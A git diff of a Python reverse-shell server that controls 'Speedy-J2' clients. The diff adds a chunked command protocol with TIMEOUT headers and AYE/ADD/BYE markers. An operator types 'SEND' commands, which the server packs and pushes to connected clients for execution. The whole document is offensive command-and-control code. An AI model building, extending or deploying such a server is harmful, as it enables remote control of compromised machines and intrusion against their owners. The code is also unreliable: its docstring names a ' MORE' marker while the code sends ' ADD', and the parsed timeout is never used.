@@ -32,21 +32,33 @@
                               `!^"'
 
 
-Server for reverse shelling with Speedy-J2 clients
+Standard library server for reverse shelling with Speedy-J2 clients
 
 Drop into a shell with keyboardInterrupt:
-        - Send everything after a SEND
-        - No padding, max 1024 bytes, end with b' AYE'
+        - Send everything after 'SEND '
         - Exit session with 'exit()'
 
-When in a session with a client, no new connections are accepted
+        Messages are at most 1024 bytes they start with b'TIMEOUT 5' and
+        end with  b' MORE', b' AYE'  or b' BYE':
+        - b 'TIMEOUT {int}' signals how long you wish to wait on a reply ins seconds
+          Commands that you do not expect to terminate MUST be ran in the background!
+        - b' MORE' signals more will follow, bodies of these messages are concatenated
+        - b' AYE' signals the end of a command, is executed by the client
+        - b' BYE' signals client to close the session
+
+        - Exit session with 'exit()'
+
+When in a session with a client, no new connections are accepted.
+If you need to interact with multiple clients concurrently, run more servers.
 """
+from math import ceil
 import subprocess
 import selectors
 import socket
 import types
 import time
 import sys
+import re
 
 HOST = '127.0.0.1'
 PORT = int(sys.argv[1])
@@ -109,21 +121,57 @@ def test_connection(key, mask):
 
 def session(s: socket):
     """
-    :param s: Connected client
-    :return:
+    :param s: A connected client
     """
-    sock.send(b'SHELL')  #
+    s.send(b'SHELL')  #
 
     while True:
-        data = input(f"{s.getpeername()[0]}: ")
-        if data[:5] == 'SEND ':
-            print(data[5:])
-            s.send(data[5:].encode())
-            assert len(data[5:]) <= 1024
-            assert data[:-4] == ' AYE'
+        ui = input(f"{s.getpeername()[0]}: ")  # Loop until exit()
 
-        elif data == 'exit()':
+        if ui[:5] == 'SEND ':  # Prepare a command message
+            if ui[5:12] != 'TIMEOUT':  # Timeout was not set by user
+                body = ui[5:]
+                packets = prepare_command(body)
+            else:
+                timeout = re.search(r'\d+', ui).group() # Search the first integer
+                body = ui[12+len(timeout)+1:]  # 'SEND TIMEOUT len(int) '
+                packets = prepare_command(body)
+
+            for packet in packets:
+                print(packet)
+                s.send(packet)
+
+        elif ui == 'exit()':
+            s.send(b'TIMEOUT 0 exit 0 BYE')
+            print("Laters")
             break
+
+
+def prepare_command(message: str, timeout='5'):
+    """
+    Chop a message into chunks of max 1024 bytes incl. TIMEOUT and endings ADD/AYE
+    """
+
+    packets = []
+    bodysize = 1024 - len(f'TIMEOUT {timeout} ') - len(' ADD')
+    chunks = ceil(len(message) / bodysize)
+
+    for chunk in range(0, chunks - 1):
+        data = b'TIMEOUT ' + timeout.encode() + b' '
+        data += message[:bodysize].encode()
+        data += b' ADD'  # Signal more will follow
+        message = message[bodysize:]
+        packets.append(data)
+
+    # Last chunk
+    data = b'TIMEOUT ' + str(timeout).encode() + b' '
+    data += message[:bodysize].encode()
+    data += b' AYE'  # Signal end
+    packets.append(data)
+
+    return packets
+
+
 
 # The event loop
 while True:
